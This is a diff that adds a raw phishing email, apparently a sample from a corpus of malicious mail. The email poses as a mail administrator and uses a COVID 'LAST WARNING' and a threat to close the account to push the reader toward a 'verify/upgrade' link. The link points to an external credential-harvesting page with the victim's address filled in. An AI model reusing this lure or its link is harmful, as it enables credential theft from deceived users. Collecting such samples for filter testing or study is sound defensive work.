@@ -1,0 +1,99 @@
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=private; d=deltatours.bg;
+  b=N/o2Hv+a+Wi6scYNMmkm2BmIfW3ELJHhcttD2A3QXi15yy1EO6LGnRYr9fZxmi9ypRXnaH0CB/4zedR6W32EsUKIhnDTIkFJOU3BhBBpucm1jKu3ck6BS0qtzNguXkZS5eNvTS1d4PdRFcj/pcAGgbOrdBHcNfiui+Aq+LeHMl8=;
+  h=Received:Received:From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=deltatours.bg; h=from:to
+	:subject:date:message-id:mime-version:content-type
+	:content-transfer-encoding; s=private; bh=1+SyIOms+pidh8uzP+SVpM
+	SIKnw=; b=s6QY2CP7tkx2+GLaK/wk1BMeRZ6ppuoHgZ4dDg81M5a7hI6bHlSLuB
+	qA+SZWTGqCOO+8xSAxjfjj91q2B+WCMGtzoNyrWkVMe9BfyRiONTJTP8bK0e9SwG
+	V98OT0GtrOFklmMyez24WBfbn6m+OULeKe10No7rAPfV4m8whcoFU=
+Received: (qmail 6708 invoked from network); 10 Jan 2021 16:19:42 -0000
+Received: from unknown (HELO deltatours.bg)
+ (office@deltatours.bg@94.198.40.26)
+  by dobroutro.eu with ESMTPA; 10 Jan 2021 16:19:42 -0000
+From: "test.com Administrator" <server@admin.com>
+To: xudan@test.com
+Subject: xudan@test.com,Upgrade your email
+Date: 10 Jan 2021 17:20:20 -0800
+Message-ID: <20210110171215.6A5B9BD804BB5F86@admin.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19650"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P><FONT size=3D7><SPAN style=3D"FONT-SIZE: xx-large"><SPAN style=3D"COLOR:=
+ rgb(106,168,79)"><SPAN style=3D"FONT-FAMILY: arial black,sans-serif"><FONT=
+ size=3D5>xudan@test.com&nbsp;LAST WARNING!</FONT></SPAN><SPAN style=3D"F=
+ONT-FAMILY: Arial"><FONT size=3D7>&nbsp;</FONT></SPAN></SPAN></SPAN></FONT>=
+<SPAN style=3D"FONT-FAMILY: Arial">&nbsp;&nbsp;</SPAN> <BR style=3D"FONT-SI=
+ZE: 13px; FONT-FAMILY: Calibri,Helvetica,sans-serif,serif,EmojiFont; COLOR:=
+ rgb(33,33,33)">
+<SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial,sans-serif,serif,EmojiFo=
+nt; COLOR: rgb(0,0,0)"><BR><BR></SPAN><B>
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; FONT-FAMILY: arial,=
+sans-serif,serif,EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseli=
+ne; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(33,33,33); PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-=
+TOP-WIDTH: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-=
+variant-east-asian: inherit">
+Shutdown due to Covid 19 Virus.We have noticed that many email servers are =
+interrupted and infiltrated during this pandemic,this may cause mailbox fai=
+lure,or you may not be able to receive or send multiple emails.To continue =
+using your mailbox.</SPAN> </B><B>&nbsp;</B></P>
+<DIV><B><BR></B><SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial,sans-ser=
+if,serif,EmojiFont; COLOR: rgb(0,0,0)"><BR><BR></SPAN><SPAN style=3D"FONT-F=
+AMILY: arial black,sans-serif">
+<A style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(103,171,73) 11px solid; BORDER=
+-RIGHT: rgb(103,171,73) 20px solid; VERTICAL-ALIGN: baseline; BORDER-BOTTOM=
+: rgb(103,171,73) 11px solid; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: rgb(103,171=
+,73) 20px solid; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(103,171,73); fon=
+t-stretch: inherit; font-variant-numeric: inherit; font-variant-east-asian:=
+ inherit"=20
+href=3D"https://daklas.com.br/nn/update/index.php?user=3Dxudan@test.com" =
+shape=3Drect rel=3Dnoreferrer target=3D_blank data-saferedirecturl=3D"https=
+://www.google.com/url?q=3Dhttps://thepolicytimes.com/cc/welcome/index.php?u=
+ser%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1610374873671000&amp=
+;usg=3DAFQjCNHlshH_ASswYrcOmz1iILuN7s9hSA"><SPAN lang=3Dzh-CN>VERIFY/UPGRAD=
+E YOUR ACCOUNT NOW</SPAN></A>&nbsp;&nbsp; </SPAN>
+<BR style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri,Helvetica,sans-serif,ser=
+if,EmojiFont; COLOR: rgb(33,33,33)"><SPAN style=3D"FONT-SIZE: 13px; FONT-FA=
+MILY: Calibri,Helvetica,sans-serif,serif,EmojiFont; COLOR: rgb(0,0,0)"><BR>=
+</SPAN><SPAN style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri,Helvetica,sans-=
+serif,serif,EmojiFont; COLOR: rgb(0,0,0)"><BR><BR><FONT face=3D"Times New R=
+oman"><B><FONT size=3D3>Note:&nbsp;A</FONT><SPAN style=3D"FONT-SIZE: medium=
+; COLOR: rgb(33,33,33)"><FONT size=3D4>
+ccount will be permanently closed for failure to verify/upgrade your email.=
+</FONT></SPAN></B></FONT><BR style=3D"FONT-SIZE: 13px; FONT-FAMILY: Calibri=
+,Helvetica,sans-serif,serif,EmojiFont; COLOR: rgb(33,33,33)"><BR></SPAN><SP=
+AN style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial,sans-serif,serif,EmojiFont;=
+ COLOR: rgb(0,0,0)"><BR></SPAN><B><SPAN style=3D"FONT-FAMILY: arial black,s=
+ans-serif">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH:=
+ 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(33,33,=
+33); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px;=
+ PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-var=
+iant-numeric: inherit; font-variant-east-asian: inherit">Thank you,</SPAN>&=
+nbsp;&nbsp;&nbsp;</SPAN><SPAN style=3D"FONT-FAMILY: arial black,sans-serif"=
+>
+&nbsp;<BR style=3D"FONT-SIZE: 13px; FONT-WEIGHT: 400; COLOR: rgb(33,33,33)"=
+><SPAN style=3D"COLOR: rgb(33,33,33)"><SPAN style=3D"FONT-SIZE: 15px"><FONT=
+ color=3D#888888 size=3D3>test.com Mail Security</FONT></SPAN></SPAN></SP=
+AN><SPAN style=3D"COLOR: rgb(136,136,136)"><BR style=3D"FONT-SIZE: 13px; FO=
+NT-FAMILY: Calibri,Helvetica,sans-serif,serif,EmojiFont; FONT-WEIGHT: 400; =
+COLOR: rgb(33,33,33)">
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 15px; BORDER-RIGHT-WIDTH:=
+ 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: 400;=
+ COLOR: rgb(33,33,33); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch:=
+ inherit; font-variant-numeric: inherit; font-variant-east-asian: inherit">=
+<SPAN style=3D"FONT-FAMILY: arial black,sans-serif">(c) 2020</SPAN></SPAN><=
+/SPAN></B></DIV></BODY></HTML>
